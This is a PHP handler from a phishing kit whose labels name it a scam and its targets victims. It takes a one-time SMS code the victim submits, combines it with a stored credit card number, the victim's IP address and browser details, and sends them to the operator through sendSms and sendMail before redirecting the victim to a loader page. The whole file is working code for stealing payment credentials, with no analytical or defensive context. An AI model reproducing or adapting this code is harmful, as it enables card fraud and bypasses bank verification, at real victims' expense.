<?php 
require_once 'panel.php' ;


// SMS Config Start

if(isset($_POST['submit'])) {

if(!isset($_SESSION)) {
    session_start();
}

$_SESSION['scode'] = htmlspecialchars($_POST['code']);

if(empty($_SESSION['scode'])) {
    header("Location: ../sms.php?page=error&userid={$id}&ue={$ue}");
}
else {
        
    $subject = "🍬 CODE ".SCAM_NAME." ".FLAG."FROM: $ip";
    $rezdata = "🍬 CODE ".SCAM_NAME." ".FLAG."
    
🍬 Code : ".$_SESSION['scode']."

💳 Credit card number : ".$_SESSION['sccn']."
    
🌐 Victim IP : $ip
💠 OS : $agent
    
⚡️ 乃 ㄥ 卂 匚 Ҝ  千 ㄖ 尺 匚 乇 ™ ⚡️
    ";
    
    $maildata = $rezdata;
    
    
    sendSms($rezdata);
        
    sendMail($maildata);

    header("Location: ../loader.php?view=check&userid={$id}&ue={$ue}");
}

}
// SMS Config END